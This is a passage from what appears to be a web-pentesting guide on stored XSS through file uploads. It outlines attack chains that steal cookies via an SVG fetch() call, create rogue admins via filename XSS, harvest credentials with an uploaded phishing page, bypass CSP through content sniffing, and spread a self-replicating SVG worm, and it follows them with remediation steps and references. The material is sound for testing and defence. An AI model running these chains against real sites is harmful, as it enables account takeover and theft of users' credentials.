  rm -f /tmp/poc_fn.jpg /tmp/poc_svg.svg /tmp/poc_exif.jpg
  ```
  :::
::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: SVG Upload → Cookie Theft → Account Takeover
  ---
  1. Upload SVG with `fetch()` sending `document.cookie` to attacker
  2. Victim views profile/gallery → SVG renders → JS executes
  3. Session cookie sent to attacker's server
  4. Attacker replays cookie → full account access
  5. Change email/password for permanent takeover
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Filename XSS → Admin Panel → Privilege Escalation
  ---
  1. Upload file with `<script>` in filename
  2. Admin views file listing → XSS fires in admin context
  3. JS creates new admin user via admin API
  4. Attacker logs in as new admin
  5. Full admin access achieved
  :::

  :::card
  ---
  icon: i-lucide-link
  title: EXIF XSS → Photo Gallery → Mass Compromise
  ---
  1. Upload photo with XSS in EXIF Comment field
  2. Gallery displays "Photo info" with unencoded Comment
  3. EVERY user viewing gallery triggers the XSS
  4. JS steals all viewers' session cookies
  5. Mass account compromise
  :::

  :::card
  ---
  icon: i-lucide-link
  title: HTML Upload → Phishing → Credential Harvest
  ---
  1. Upload HTML phishing page as `login.html`
  2. Hosted at `target.com/uploads/login.html` (trusted domain)
  3. Share link — victims see `target.com` in URL bar
  4. Enter credentials in fake form
  5. Credentials exfiltrated to attacker
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Content Sniffing → Image XSS → CSP Bypass
  ---
  1. CSP: `script-src 'self'` (scripts from same origin only)
  2. Upload HTML as `.jpg` to same-origin upload directory
  3. Missing `nosniff` → browser sniffs as HTML
  4. JavaScript from `'self'` → CSP satisfied
  5. Full XSS despite Content Security Policy
  :::

  :::card
  ---
  icon: i-lucide-link
  title: SVG Upload → Self-Replicating Worm
  ---
  1. SVG contains JS that calls upload API to create copies
  2. When victim views SVG, JS uploads same SVG to victim's profile
  3. Victim's contacts view their profile → worm spreads further
  4. Exponential propagation
  5. Platform-wide compromise within hours
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Filename XSS → Email Notification → Drive-By XSS
  ---
  1. Upload file with `<script>` in filename
  2. Application sends email: "User uploaded [FILENAME]"
  3. If email client renders HTML with unencoded filename
  4. XSS fires in victim's email client
  5. Pivots to email-based attacks
  :::
::

---

## Reporting & Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: HTML-Encode All Output
  ---
  Every piece of user-supplied data (filenames, metadata, properties) must be context-appropriately encoded before rendering. Use `htmlspecialchars()` (PHP), `escape()` (Jinja2), `DOMPurify` (JS), or framework auto-escaping.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Block SVG/HTML Uploads
  ---
  Block `.svg`, `.html`, `.htm`, `.xhtml`, `.mhtml`, `.hta`, `.shtml`. If SVGs required, sanitize with DOMPurify removing ALL `<script>`, event handlers, `<foreignObject>`, and external references.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Content-Disposition attachment
  ---
  Serve ALL uploaded files with `Content-Disposition: attachment`. Forces download instead of rendering. Prevents SVG XSS, HTML XSS, and content sniffing.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: X-Content-Type-Options nosniff
  ---
  Add `nosniff` to ALL responses serving uploaded content. Prevents browsers from sniffing HTML in non-HTML files.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Separate Upload Domain
  ---
  Serve uploads from `uploads.target-cdn.com` with no cookies. Even if XSS fires, Same-Origin Policy blocks access to main app data.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Strip Metadata
  ---
  Re-encode images through image library, stripping ALL EXIF/IPTC/XMP metadata. Save clean pixel-only copies.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Sanitize Filenames
  ---
  Strip ALL special characters: `[a-zA-Z0-9_.-]` whitelist only. Or generate random filenames server-side.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Restrictive CSP on Upload Paths
  ---
  ```
  Content-Security-Policy: default-src 'none'; img-src 'self'; style-src 'unsafe-inline'
  ```
  Blocks all script execution on upload-serving endpoints.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Stored XSS
  to: https://owasp.org/www-community/attacks/xss/#stored-xss-attacks
  target: _blank
  ---
  OWASP reference for Stored XSS covering prevention and testing methodology.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Upload XSS
  to: https://book.hacktricks.wiki/en/pentesting-web/file-upload/
  target: _blank
  ---
  Comprehensive guide covering SVG, HTML, content sniffing, filename injection, and EXIF metadata XSS.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — Stored XSS Labs
  to: https://portswigger.net/web-security/cross-site-scripting/stored
  target: _blank
  ---
  Interactive labs for practicing Stored XSS including file upload scenarios.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — XSS
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  target: _blank
  ---
  Community XSS payload repository with SVG payloads and filter bypasses.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: DOMPurify — SVG Sanitizer
  to: https://github.com/cure53/DOMPurify
  target: _blank
  ---
  JavaScript library for sanitizing HTML/SVG — essential for safe SVG uploads.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: MDN — X-Content-Type-Options
  to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
  target: _blank
  ---
  Documentation for the `nosniff` directive preventing content sniffing.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — XSS via Upload Reports
  to: https://hackerone.com/hacktivity?querystring=stored%20xss%20upload
  target: _blank
  ---
  Real-world disclosed reports demonstrating Stored XSS via file upload.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: MIME Sniffing Standard
  to: https://mimesniff.spec.whatwg.org/
  target: _blank
  ---
  Official web standard defining browser content sniffing behavior.
  :::
::